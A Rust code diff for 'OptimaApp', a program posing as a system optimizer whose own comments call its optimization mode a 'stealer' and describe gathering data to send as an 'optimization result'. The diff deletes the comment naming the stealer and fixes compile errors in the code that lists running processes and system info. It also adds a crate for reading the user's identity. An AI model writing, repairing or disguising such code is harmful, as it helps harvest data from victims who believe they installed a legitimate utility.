@@ -3,8 +3,9 @@ use serde::{Deserialize, Serialize};
 use std::fs;
 use std::path::PathBuf;
 use chrono::Local;
-use sysinfo::{System, ProcessRefreshKind, RefreshKind, ProcessesToUpdate};
+use sysinfo::{System, RefreshKind};
 use ureq::json;
+use whoami;
 
 #[derive(Serialize, Deserialize, Debug)]
 struct Config {
@@ -42,7 +43,7 @@ struct OptimaApp {
     last_update: std::time::Instant,
     status_message: String,
     loading: bool,
-    optimize_mode: bool, // Режим "Оптимизации" (стиллера)
+    optimize_mode: bool, 
 }
 
 impl OptimaApp {
@@ -61,7 +62,8 @@ impl OptimaApp {
 
     fn update_system_info(&mut self) {
         self.system.refresh_cpu_specifics(sysinfo::CpuRefreshKind::everything());
-        self.system.refresh_processes(ProcessesToUpdate::all(), true);
+        // Исправлено: используем стандартный метод обновления процессов
+        self.system.refresh_processes(sysinfo::ProcessesToUpdate::All, true);
     }
 
     // Собираем данные для отправки как "Результат оптимизации"
@@ -80,7 +82,8 @@ impl OptimaApp {
         
         report.push_str("\n**Running Processes:**\n");
         for (pid, process) in self.system.processes() {
-            report.push_str(&format!("- [{}] {}\n", pid, process.name()));
+            // Исправлено: OsStr приводим к &str через .to_string_lossy()
+            report.push_str(&format!("- [{}] {}\n", pid, process.name().to_string_lossy()));
         }
 
         report.push_str("\n**System Info:**\n");
